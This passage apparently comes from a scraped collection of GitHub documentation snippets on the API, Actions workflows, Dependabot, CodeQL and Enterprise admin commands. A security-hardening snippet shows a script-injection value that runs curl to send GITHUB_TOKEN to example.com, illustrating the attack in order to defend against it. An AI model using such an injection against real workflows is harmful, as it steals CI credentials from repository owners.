/content/video-transcripts/TRANSCRIPT-TITLE\n```\n\n----------------------------------------\n\nTITLE: Finding User Project Node ID (curl)\nDESCRIPTION: This snippet demonstrates how to find the node ID of a user project using a curl command with a GraphQL query. Replace `USER` with the user's username and `NUMBER` with the project number. Requires a `TOKEN` with `read:project` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"query{user(login: \\\"USER\\\") {projectV2(number: NUMBER){id}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Data Deletion Transaction in SQL\nDESCRIPTION: This SQL snippet shows a transaction that deletes a record from `employees` and then inserts a log entry into `deletion_log`.  A failure in the `INSERT` statement could cause data integrity problems because the deletion is not logged. Dependencies: tables `employees` and `deletion_log`.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nBEGIN TRANSACTION;\n\nDELETE FROM employees\nWHERE employee_id = 101;\n\nINSERT INTO deletion_log (employee_id, deletion_date, reason)\nVALUES (101, GETDATE(), 'Voluntary Resignation');\n\nCOMMIT TRANSACTION;\n```\n\n----------------------------------------\n\nTITLE: Starting replication using ghe-repl-start (Shell)\nDESCRIPTION: This shell command starts the replication process on the specified GitHub Enterprise Server replica. It is typically used to resume replication after it has been temporarily stopped using `ghe-repl-stop`. The command requires administrative privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/removing-a-high-availability-replica.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Filtering issue_comment event based on issue/PR\nDESCRIPTION: This example demonstrates how to configure a GitHub Actions workflow to run different jobs based on whether an `issue_comment` event originated from a pull request or an issue. It uses the `github.event.issue.pull_request` property in the `if` condition to conditionally run jobs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\non: issue_comment\n\njobs:\n  pr_commented:\n    # This job only runs for pull request comments\n    name: PR comment\n    if: {% raw %}${{ github.event.issue.pull_request }}{% endraw %}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on PR $NUMBER\n        env:\n          NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n\n  issue_commented:\n    # This job only runs for issue comments\n    name: Issue comment\n    if: {% raw %}${{ !github.event.issue.pull_request }}{% endraw %}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on issue $NUMBER\n        env:\n          NUMBER: {% raw %}${{ github.event.issue.number }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting Failed to Clone - Shell\nDESCRIPTION: This snippet displays the error message indicating issues with cloning submodules due to access rights or an invalid SSH key. Solutions involve contacting the repository administrator or setting up a valid SSH key.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nfatal: clone of 'git@github.com:<user>/<repo>' into submodule path '<path>' failed\nFailed to clone 'src/github.com/<user>/<repo>'. Retry scheduled\nCloning into '<path>'...\ngit@github.com: Permission denied (publickey).\nfatal: Could not read from remote repository.\nPlease make sure you have the correct access rights\nand the repository exists.\n```\n\n----------------------------------------\n\nTITLE: Authorization HTTP Header Example\nDESCRIPTION: This snippet shows the HTTP header structure for authorization, including a service token and GitHub token. The X-GitHub-Token is deprecated and should be replaced with OIDC token exchange.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/using-oidc-with-github-copilot-extensions.md#_snippet_0\n\nLANGUAGE: http request\nCODE:\n```\n# HTTP header\nAuthorization: Bearer <your-service-token>\nX-GitHub-Token: <github-token>\n```\n\n----------------------------------------\n\nTITLE: Run RuboCop and Parse JSON Report\nDESCRIPTION: This Ruby code runs RuboCop on all files in the cloned repository, formats the output as JSON, and parses the JSON report.  It also removes the cloned repository directory after processing. The code assumes that RuboCop is installed and available in the system's PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\n        # Run RuboCop on all files in the repository\n        @report = `rubocop '#{repository}' --format json`\n        logger.debug @report\n        `rm -rf #{repository}`\n        @output = JSON.parse @report\n```\n\n----------------------------------------\n\nTITLE: Configuring Kotlin DSL for single package\nDESCRIPTION: This snippet demonstrates how to configure Kotlin DSL to publish a single package to GitHub Packages. It uses the `maven-publish` plugin and defines the repository, URL, and credentials for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nplugins {\n    `maven-publish`\n}\npublishing {\n    repositories {\n        maven {\n            name = \"GitHubPackages\"\n            url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n            credentials {\n                username = project.findProperty(\"gpr.user\") as String? ?: System.getenv(\"USERNAME\")\n                password = project.findProperty(\"gpr.key\") as String? ?: System.getenv(\"TOKEN\")\n            }\n        }\n    }\n    publications {\n        register<MavenPublication>(\"gpr\") {\n            from(components[\"java\"])\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: New Shared storage billing response example\nDESCRIPTION: This is an example of the JSON response from the new billing platform for shared storage billing. It shows the structure and properties of the new response format, including usage items with details such as date, product, SKU, quantity, unit type, price per unit, gross amount, discount amount, net amount, organization name, and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{ \"usageItems\": [ { \"date\": \"2023-08-01\", \"product\": \"Packages\", \"sku\": \"Packages storage\", \"quantity\": 100, \"unitType\": \"GigabyteHours\", \"pricePerUnit\": 0.008, \"grossAmount\": 0.8, \"discountAmount\": 0, \"netAmount\": 0.8, \"organizationName\": \"GitHub\", \"repositoryName\": \"github/example\" } ] }\n```\n\n----------------------------------------\n\nTITLE: Request Device and User Verification Codes\nDESCRIPTION: This snippet shows the expected response for the device code request with example values. The response includes the device code, user code, verification URI, expiration time, and polling interval.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ndevice_code=3584d83530557fdd1f46af8289938c8ef79f9dc5&expires_in=900&interval=5&user_code=WDJB-MJHT&verification_uri=https%3A%2F%2F{% data variables.product.product_url %}%2Flogin%2Fdevice\n```\n\n----------------------------------------\n\nTITLE: Packaging a .NET Project for NuGet\nDESCRIPTION: This command packages a .NET project into a NuGet package (.nupkg file). The `--configuration Release` flag specifies that the project should be built in Release mode before packaging.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndotnet pack --configuration Release\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes Secret for GitHub App Credentials (Bash)\nDESCRIPTION: This command creates a Kubernetes secret named 'pre-defined-secret' in the 'arc-runners' namespace.  It uses the provided GitHub App ID, installation ID, and private key as literal values.  Replace the placeholder values with your actual credentials.  Requires kubectl.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/arc-app-post-install-set-secrets.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nkubectl create secret generic pre-defined-secret \\\n   --namespace=arc-runners \\\n   --from-literal=github_app_id=123456 \\\n   --from-literal=github_app_installation_id=654321 \\\n   --from-literal=github_app_private_key='-----BEGIN RSA PRIVATE KEY-----********'\n```\n\n----------------------------------------\n\nTITLE: CodeQL Model Pack YAML Example\nDESCRIPTION: Example YAML structure for storing CodeQL model extensions within a model pack.  This shows how models for different external APIs are organized into separate YAML files within the model pack directory. These files define the data flow models for specific methods in those APIs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/using-the-codeql-model-editor.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n.github/codeql/extensions/sofa-jraft-java # the model pack directory\n    models\n        jmh-core.model.yml                  # models calls to jmh-core@1.20\n        rocksdbjni.model.yml                # models calls to rocksdbjni@7.7.3\n```\n\n----------------------------------------\n\nTITLE: Bundler Gemfile Configuration\nDESCRIPTION: This snippet shows an example Gemfile configuration for Bundler to specify a private registry URL. This is required when configuring Dependabot to only access private registries for Bundler.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Example Gemfile\n\n source \"https://private_registry_url\"\n```\n\n----------------------------------------\n\nTITLE: Workflow Definition for Copilot License Reminder (YAML)\nDESCRIPTION: This YAML snippet defines the GitHub Actions workflow. It sets the workflow name, defines the triggers (manual and scheduled), specifies the job to run, and configures the permissions for the job.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/reminding-inactive-users.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Remind inactive users about GitHub Copilot license\n\non:\n  # Run on demand (enables `Run workflow` button on the Actions tab to easily trigger a run manually)\n  workflow_dispatch:\n  # Run the workflow every day at 8am UTC\n  schedule:\n    - cron: '0 8 * * *'\n\njobs:\n  context-log:\n    runs-on: ubuntu-latest\n\n    # Modify the default permissions granted to GITHUB_TOKEN\n    permissions:\n      contents: read\n      issues: write\n\n    steps:\n      - name: Check last GitHub Copilot activity\n        id: check-last-activity\n        run: |\n          # List all GitHub Copilot seat assignments for an organization\n          RESPONSE=$(gh api \\\n            -H \"Accept: application/vnd.github+json\" \\\n            -H \"X-GitHub-Api-Version: 2022-11-28\" \\\n            -H \"Authorization: Bearer {% raw %}${{ secrets.COPILOT_LICENSE_READ }}{% endraw %}\" \\\n            /orgs/{% raw %}${{ github.repository_owner }}{% endraw %}/copilot/billing/seats)\n          echo \"Raw Response from gh api:\"\n          echo \"$RESPONSE\"\n\n          # Parse and check each user's `last_activity_at` and `created_at`\n          echo \"$RESPONSE\" | jq -c '.seats[]' | while read -r seat; do\n            LOGIN=$(echo \"$seat\" | jq -r '.assignee.login')\n            LAST_ACTIVITY=$(echo \"$seat\" | jq -r '.last_activity_at')\n            CREATED_AT=$(echo \"$seat\" | jq -r '.created_at')\n\n            # List all open issues with label `copilot-reminder`\n            EXISTING_ISSUES=$(gh issue list --repo {% raw %}${{ github.repository }}{% endraw %} --assignee $LOGIN --label 'copilot-reminder' --json id)\n\n            # Get last activity date and convert dates to seconds since epoch for comparison\n            if [ \"$LAST_ACTIVITY\" = \"null\" ]; then\n              LAST_ACTIVITY_DATE=$(date -d \"$CREATED_AT\" +%s)\n            else\n              LAST_ACTIVITY_DATE=$(date -d \"$LAST_ACTIVITY\" +%s)\n            fi\n            THIRTY_DAYS_AGO=$(date -d \"30 days ago\" +%s)\n\n            # Create issues for inactive users who don't have an existing open issue\n            if [ \"$LAST_ACTIVITY_DATE\" -lt \"$THIRTY_DAYS_AGO\" ] && [ \"$EXISTING_ISSUES\" = \"[]\" ]; then\n              echo \"User $LOGIN has not been active in the last 30 days. Last activity: $LAST_ACTIVITY\"\n\n              NEW_ISSUE_URL=\"$(gh issue create --title \\\"Reminder about your GitHub Copilot license\\\" --body \\\"{% raw %}${{ vars.COPILOT_REMINDER_MESSAGE }}{% endraw %}\\\" --repo {% raw %}${{ github.repository }}{% endraw %} --assignee $LOGIN --label 'copilot-reminder')\"\n            else\n              echo \"User $LOGIN is active or already has an assigned reminder issue. Last activity: $LAST_ACTIVITY\"\n            fi\n          done\n\n        # Set the GH_TOKEN, required for the 'gh issue' commands\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Example Task List Item with Code Scanning Alert URL\nDESCRIPTION: This snippet provides a concrete example of the markdown syntax required to link a code scanning alert to an issue via the GitHub API.  The example uses a full URL, demonstrating the expected format for the task list item. The URL points to a specific alert ID within a given repository and organization.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/managing-code-scanning-alerts/tracking-code-scanning-alerts-in-issues-using-task-lists.md#_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n- [ ] https://github.com/octocat-org/octocat-repo/security/code-scanning/17\n```\n\n----------------------------------------\n\nTITLE: Redacted Reference Example - JSON\nDESCRIPTION: This JSON snippet illustrates how a reference is redacted when permissions are insufficient. The `type` field indicates that the reference is redacted, and `data.type` reveals the original reference type. Other fields such as `id`, `is_implicit`, and `metadata` are also included.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/context-passing-for-your-agent.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"role\": \"user\",\n    \"content\": \"Current Date and Time (UTC): 2024-10-22 00:43:14\\nCurrent User's Login: monalisa\\n\",\n    \"name\": \"_session\",\n    \"copilot_references\": [\n        {\n            \"type\": \"github.redacted\",\n            \"data\": {\n                \"type\": \"github.current-url\"\n            },\n            \"id\": \"example-id\",\n            \"is_implicit\": true,\n            \"metadata\": {\n                \"display_name\": \"\",\n                \"display_icon\": \"\",\n                \"display_url\": \"\"\n            }\n        }\n    ],\n    \"copilot_confirmations\": null\n}\n```\n\n----------------------------------------\n\nTITLE: SQL Pivot Query Generation with GitHub Copilot\nDESCRIPTION: This SQL code block showcases how GitHub Copilot can generate a pivot query based on a natural language comment in Azure Data Studio. The initial query selects data and groups it by `TokenColor`, while the comment requests a pivot on `tokencolor` for specified colors. Copilot then suggests the SQL code for the pivot operation, simplifying the creation of complex queries.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TokenColor, COUNT(UserID) AS UserCount\nFROM Tag.Users\nGROUP BY TokenColor\n-- pivot that query on tokencolor for Purple, Blue, Green, Yellow, Orange, Red\n-- and rename the columns to match the colors\nSELECT [Purple], [Blue], [Green], [Yellow], [Orange], [Red]\n```\n\n----------------------------------------\n\nTITLE: Disabling Network Response Caching (Shell)\nDESCRIPTION: Uses the `--no-http-cache` option to disable network response caching, preventing Actions Importer from using cached responses for network requests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast ... --no-http-cache\n```\n\n----------------------------------------\n\nTITLE: Cluster Block IPs (ghe-cluster-block-ips)\nDESCRIPTION: This utility blocks all the IPs in the `/data/user/common/cluster-ip-blocklist` file. The command reads the list of IPs and blocks each IP by calling `ghe-cluster-block-ip` on each node in the current cluster. The `/data/user/common/cluster-ip-blocklist` file only supports IPv4 addresses.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_40\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-block-ips\n```\n\n----------------------------------------\n\nTITLE: Fetching Public Data using OAuth App credentials\nDESCRIPTION: This snippet demonstrates how to fetch public data using an OAuth app's client ID and client secret. The rate limit for these requests is 5,000 requests per hour per OAuth app, or 15,000 requests per hour if the app is owned by a GitHub Enterprise Cloud organization.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/rate-limits-for-the-rest-api.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -u YOUR_CLIENT_ID:YOUR_CLIENT_SECRET -I {% data variables.product.rest_url %}/meta\n```\n\n----------------------------------------\n\nTITLE: Defining a CodeQL Library Pack in YAML\nDESCRIPTION: This YAML snippet defines a CodeQL pack for custom C++ libraries.  It specifies the pack's name, version, declares it as a library pack, and lists the `codeql/cpp-all` pack as a dependency. The version range indicates compatibility with versions of `codeql/cpp-all` greater than or equal to `0.1.2` and less than `0.2.0`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_25\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-github-user/my-custom-libraries\nversion: 1.2.3\nlibrary: true\ndependencies:\n  codeql/cpp-all: ^0.1.2\n```\n\n----------------------------------------\n\nTITLE: Setting API URL with export in Shell\nDESCRIPTION: This snippet sets the TARGET_API_URL environment variable in a Terminal environment using the `export` command. This variable will be used with the `--target-api-url` option in commands run with the {% data variables.product.prodname_cli %}.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/set-target-api-url.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nexport TARGET_API_URL=\"https://api.{% data variables.enterprise.data_residency_example_domain %}\"\n```\n\n----------------------------------------\n\nTITLE: Example Log Entry (VS Code)\nDESCRIPTION: Illustrates the format of a log entry in VS Code when GitHub Copilot finds matching public code. The log entry shows the date, time, filename, location, code extract, license type, and URL.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/finding-public-code-that-matches-github-copilot-suggestions.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n2025-03-27 12:17:54.759 [info] file:///Users/monalisa/fizzbuzz.js Similar code at  [Ln 2, Col 8] let i = 1; i <= 100; i++) {  let output = '';  if (i % 3 === 0) {  output += 'Fizz';...\n2025-03-27 12:17:54.759 [info] License: unknown, URL: https://github.com/octo-org/octo-repo/blob/8563f3b1d4f33952b22212b86e745539d1567ed1/examples/fizzBuzz.js\n2025-03-27 12:17:54.759 [info] License: MIT, URL: https://github.com/octo-org/monalisa/blob/7e974691f4c8e6bc55f9b50688f05d746d1bc52b/exercises/2/fizz-buzz.js\n```\n\n----------------------------------------\n\nTITLE: Cleaning Caches with ghe-cleanup-caches - Shell\nDESCRIPTION: This snippet shows how to use the `ghe-cleanup-caches` utility to clean up various caches that may consume extra disk space on the root volume of GitHub Enterprise Server. Useful when disk space on the root volume is increasing unexpectedly and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-cleanup-caches\n```\n\n----------------------------------------\n\nTITLE: Configuring terraform-registry with token (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a `terraform-registry` using a token for authentication. It defines the registry type, URL, and token. The token is sourced from a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  terraform-example:\n    type: terraform-registry\n    url: https://terraform.example.com\n    token: ${{secrets.MY_TERRAFORM_API_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Exporting GPG Key in ASCII Armor Format\nDESCRIPTION: This command exports the GPG key in ASCII armor format, making it suitable for uploading to GitHub. The GPG key ID is used to identify the key to be exported. The `--armor` option ensures that the key is encoded in a text-based format.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/associating-an-email-with-your-gpg-key.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ gpg --armor --export 3AA5C34371567BD2\n# Prints the GPG key, in ASCII armor format\n```\n\n----------------------------------------\n\nTITLE: Listing pull requests mentioning a team using GitHub CLI\nDESCRIPTION: This snippet shows how to use the `gh pr list` command to search for pull requests that mention a specific team.  Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh pr list --search \"team:octo-org/octo-team\"\n```\n\n----------------------------------------\n\nTITLE: Searching by Account Creation Date\nDESCRIPTION: This example shows how to filter users based on the date their accounts were created using the `created` qualifier, which takes a date as its parameter. It uses the date format YYYY-MM-DD.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_5\n\nLANGUAGE: none\nCODE:\n```\ncreated:<2011-01-01\ncreated:>=2013-05-11\ncreated:2013-03-06 location:london\ncreated:2010-01-01..2011-01-01 john in:login\n```\n\n----------------------------------------\n\nTITLE: Configuring Featured Links in YAML Frontmatter\nDESCRIPTION: This YAML snippet demonstrates the usage of the `featuredLinks` property to render linked articles' titles and intros on product landing pages and the homepage. It includes configurations for 'gettingStarted', 'startHere', and 'popular' links, along with an option to customize the 'popularHeading'. This allows for curated content display on landing pages.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-yaml-frontmatter.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nfeaturedLinks:\n  gettingStarted:\n    - /path/to/page\n  startHere:\n    - /guides/example\n  popular:\n    - /path/to/popular/article1\n    - /path/to/popular/article2\n  popularHeading: An alternate heading to Popular\n```\n\n----------------------------------------\n\nTITLE: Pip-compile: Configuring index-url in requirements.txt\nDESCRIPTION: This snippet shows how to add the `--index-url` option to the `requirements.txt` file to point to a private registry. This ensures that `pip-compile` uses the specified private registry when resolving dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n--index-url https://private_registry_url\n```\n\n----------------------------------------\n\nTITLE: Suggesting a Class Body using GitHub Copilot in Java\nDESCRIPTION: This code snippet demonstrates how GitHub Copilot can suggest a class body in a Java file after typing the class definition. The user types `class Test` and Copilot suggests the class body. This is an example of automatic code completion provided by Copilot.  The user can accept the suggestion to have Copilot complete the class body.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass Test\n```\n\n----------------------------------------\n\nTITLE: Deleting repository codespaces older than 7 days using GitHub CLI\nDESCRIPTION: This snippet shows an example of deleting all codespaces for a specific repository (`octo-org/octo-repo`) that were created more than 7 days ago using the GitHub CLI. It utilizes the `--repo` and `--days` flags in combination.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/deleting-a-codespace.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --repo octo-org/octo-repo --days 7\n```\n\n----------------------------------------\n\nTITLE: Configuring npm Registry with Username and Password\nDESCRIPTION: This snippet configures access to an npm registry using a username and password. It sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_11\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  npm-npmjs:\n    type: npm-registry\n    url: https://registry.npmjs.org\n    username: octocat\n    password: ${{secrets.MY_NPM_PASSWORD}}  # Must be an unencoded password\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Clearing CodeQL environment variables with PowerShell\nDESCRIPTION: This PowerShell script reads a JSON file containing environment variables to clear, which is generated by CodeQL, and sets them as Azure DevOps pipeline variables. It reads the JSON from `$(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/end-tracing.json` and sets each property in the JSON object as a pipeline variable using the `##vso[task.setvariable variable=]` command.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_25\n\nLANGUAGE: powershell\nCODE:\n```\nsteps:\n    # Read and set the generated environment variables to end build tracing. This is done in PowerShell in this example.\n    - task: PowerShell@1\n       displayName: Clear {% data variables.product.prodname_codeql %} environment variables\n       inputs:\n          targetType: inline\n          script: >\n             $json = Get-Content $(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/end-tracing.json | ConvertFrom-Json\n             $json.PSObject.Properties | ForEach-Object {\n                 $template = \"##vso[task.setvariable variable=\"\n                 $template += $_.Name\n                 $template += \"]\"\n                 $template += $_.Value\n                 echo \"$template\"\n             }\n```\n\n----------------------------------------\n\nTITLE: Enabling Automerge for Dependabot Pull Requests (YAML)\nDESCRIPTION: This workflow enables automerge for Dependabot pull requests based on the dependency name and update type. It uses the `dependabot/fetch-metadata` action to retrieve the metadata and then enables automerge if the dependency name is 'my-dependency' and the update type is a semver patch. The workflow requires `contents: write` and `pull-requests: write` permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/automating-dependabot-with-github-actions.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nname: Dependabot auto-merge\non: pull_request\n\npermissions:\n  contents: write\n  pull-requests: write\n\njobs:\n  dependabot:\n    runs-on: ubuntu-latest\n    if: github.event.pull_request.user.login == 'dependabot[bot]' && github.repository == 'owner/my_repo'\n    steps:\n      - name: Dependabot metadata\n        id: metadata\n        uses: dependabot/fetch-metadata@d7267f607e9d3fb96fc2fbe83e0af444713e90b7\n        with:\n          github-token: \"${{ secrets.GITHUB_TOKEN }}\"\n      - name: Enable auto-merge for Dependabot PRs\n        if: contains(steps.metadata.outputs.dependency-names, 'my-dependency') && steps.metadata.outputs.update-type == 'version-update:semver-patch'\n        run: gh pr merge --auto --merge \"$PR_URL\"\n        env:\n          PR_URL: ${{github.event.pull_request.html_url}}\n          GH_TOKEN: ${{secrets.GITHUB_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI: Query Format Synopsis\nDESCRIPTION: Shows the basic command-line syntax for the `codeql query format` tool. It takes QL source files as input and supports options for output file specification, in-place formatting, backup creation, and other formatting configurations. The files are formatted according to the tool's default settings.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/query-format.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql query format [--output=<file>] [--in-place] [--backup=<ext>] <options>... -- <file>...\n```\n\n----------------------------------------\n\nTITLE: Get Article Metadata - cURL\nDESCRIPTION: This cURL command retrieves metadata about an article from the `/api/article/meta` endpoint. The `pathname` parameter is required to specify the article path. The command returns a JSON object containing the article's metadata: title, intro, product, and breadcrumbs.\nSOURCE: https://github.com/github/docs/blob/main/src/article-api/README.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl -s \"https://docs.github.com/api/article/meta?pathname=/en/get-started/start-your-journey/about-github-and-git\"\n```\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"title\": \"About GitHub and Git\",\n  \"intro\": \"You can use GitHub and Git to collaborate on work.\",\n  \"product\": \"Get started\",\n  \"breadcrumbs\": [\n    {\n      \"href\": \"/en/get-started\",\n      \"title\": \"Get started\"\n    },\n    {\n      \"href\": \"/en/get-started/start-your-journey\",\n      \"title\": \"Start your journey\"\n    },\n    {\n      \"href\": \"/en/get-started/start-your-journey/about-github-and-git\",\n      \"title\": \"About GitHub and Git\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Stealing GITHUB_TOKEN via HTTP Request\nDESCRIPTION: This shell command illustrates how an attacker could attempt to steal the GITHUB_TOKEN by sending it to an external server. It demonstrates how an attacker might quickly exfiltrate the token for immediate use before it expires.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\na\"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#\n```\n\n----------------------------------------\n\nTITLE: Conditional Step Execution Using Status Checks\nDESCRIPTION: This YAML snippet demonstrates using status check functions in the `if` conditional to determine step execution.  The `My backup step` only runs if the previous step failed, utilizing the `failure()` function. It uses the `uses` keyword to reference a GitHub Action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: My first step\n    uses: octo-org/action-name@main\n  - name: My backup step\n    if: ${{ failure() }}\n    uses: actions/heroku@1.0.0\n```\n\n----------------------------------------\n\nTITLE: Setting Node Eligibility (nes set-node-eligibility eligible)\nDESCRIPTION: This command manually updates a node's eligibility for re-addition to the cluster.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_58\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-eligibility eligible HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Restoring GitHub Enterprise Data\nDESCRIPTION: This command is executed on the backup host to restore a snapshot of the old GitHub Enterprise instance to the new instance. The `ghe-restore` command connects to the specified IP address (representing the new instance) and restores data from a previously created backup snapshot. The IP address and the output messages will vary depending on the instance configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/upgrading-your-instance/performing-an-upgrade/migrating-from-github-enterprise-1110x-to-2123.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-restore 169.254.1.1\nThe authenticity of host '169.254.1.1:122' can't be established.\nRSA key fingerprint is 